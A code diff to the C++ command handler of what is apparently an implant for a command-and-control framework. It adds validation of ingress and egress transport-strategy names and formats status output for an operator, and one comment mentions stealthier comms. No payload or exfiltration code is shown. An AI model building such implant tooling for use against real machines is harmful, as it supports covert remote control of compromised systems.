@@ -121,49 +121,74 @@ nlohmann::json command_tree(nlohmann::json task_data) {
     */
     if (task_name == "strat get") {
         nlohmann::json result;
+        std::string target_strat = task_data["task"]["args"]["strategy_name"];
 
-        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
-        std::string comms_get_function = task_data["task"]["args"]["strategy_name"];
-        
-        SettingsManager::instance().set("comms_get_function", comms_get_function);
+        // Fetch allowed strategies
+        auto allowed_strats = SettingsManager::instance().get<std::vector<std::string>>("comms_get_strats", {});
 
-        result["data"] = comms_get_function;
-        result["windows_error_code"] = ERROR_SUCCESS;
-        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+        // Validate user input against the available list - if invalid strat passd, implant could crash
+        bool found = false;
+        for (const auto& strat : allowed_strats) {
+            if (strat == target_strat) {
+                found = true; break;
+            }
+        }
 
+        if (found) {
+            SettingsManager::instance().set("comms_get_function", target_strat);
+            result["data"] = "[+] Ingress strategy successfully updated to: " + target_strat;
+            result["windows_error_code"] = ERROR_SUCCESS;
+        }
+        else {
+            result["data"] = "[-] Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
+            result["windows_error_code"] = ERROR_NOT_FOUND;
+        }
+
+        result["message"] = GetErrorMessage(result["windows_error_code"]);
         return result;
     }
+    //need to udpate
     else if (task_name == "strat post") {
         nlohmann::json result;
+        std::string target_strat = task_data["task"]["args"]["strategy_name"];
 
-        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
-        std::string comms_post_function = task_data["task"]["args"]["strategy_name"];
-        
-        SettingsManager::instance().set("comms_post_function", comms_post_function);
+        // Fetch allowed strategies
+        auto allowed_strats = SettingsManager::instance().get<std::vector<std::string>>("comms_post_strats", {});
 
-        result["data"] = comms_post_function;
-        result["windows_error_code"] = ERROR_SUCCESS;
-        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+        // Validate user input - otherwise with no correct strat, implant could crash
+        bool found = false;
+        for (const auto& strat : allowed_strats) {
+            if (strat == target_strat) {
+                found = true; break;
+            }
+        }
 
+        if (found) {
+            SettingsManager::instance().set("comms_post_function", target_strat);
+            result["data"] = "[+] Egress strategy successfully updated to: " + target_strat;
+            result["windows_error_code"] = ERROR_SUCCESS;
+        }
+        else {
+            result["data"] = "[-] Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
+            result["windows_error_code"] = ERROR_NOT_FOUND;
+        }
+
+        result["message"] = GetErrorMessage(result["windows_error_code"]);
         return result;
     }
     else if (task_name == "strat list") {
         nlohmann::json result;
+        std::string output = "--- Ingress (GET) ---\n";
 
-        std::string output = "";
-
-        //move me to strat.cpp or something, this is just a placeholder to show the concept.
-        std::map<std::string, IngressFunc> get_map = SettingsManager::instance().get<std::map<std::string, IngressFunc>>("comms_get_strat_map", {});
-        std::map<std::string, EgressFunc> post_map = SettingsManager::instance().get<std::map<std::string, EgressFunc>>("comms_post_strat_map", {});
-
-        // Loop through Ingress Map
-        for (const auto& [name, func] : get_map) {
-            output += name + "\n";
+        auto get_list = SettingsManager::instance().get<std::vector<std::string>>("comms_get_strats", {});
+        for (const auto& name : get_list) {
+            output += "  > " + name + "\n";
         }
 
-        // Loop through Egress Map
-        for (const auto& [name, func] : post_map) {
-            output += name + "\n";
+        output += "\n--- Egress (POST) ---\n";
+        auto post_list = SettingsManager::instance().get<std::vector<std::string>>("comms_post_strats", {});
+        for (const auto& name : post_list) {
+            output += "  > " + name + "\n";
         }
 
         result["data"] = output;
@@ -178,19 +203,17 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         std::string get_strategy = SettingsManager::instance().get<std::string>("comms_get_function", "");
         std::string post_strategy = SettingsManager::instance().get<std::string>("comms_post_function", "");
 
-        //hardcode data response, these do not have the saem req's as modules, as they aren't modules. 
-        ////note - this may move to a settings option later. 
-        //add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
-        //add_int_result(result, "windows_error_code", ERROR_SUCCESS);
-        //add_text_result(result, "data", "");
+        // Format the "data" field so the operator gets a clean visual read
+        //probably can strip this out for more stealthy comms
+        std::string output = "--- Active Transport Strategies ---\n";
+        output += "[*] Ingress (GET)  : " + get_strategy + "\n";
+        output += "[*] Egress (POST) : " + post_strategy + "\n";
 
-        //add_text_result(result, "comms_get_strategy", get_strategy);
-        //add_text_result(result, "comms_post_strategy", post_strategy);
-
-        result["data"] = "";
+        result["data"] = output;
         result["windows_error_code"] = ERROR_SUCCESS;
         result["message"] = GetErrorMessage(ERROR_SUCCESS);
 
+        // Keep the raw JSON fields in case your Python Team Server relies on them for UI mapping
         result["comms_get_strategy"] = get_strategy;
         result["comms_post_strategy"] = post_strategy;
 
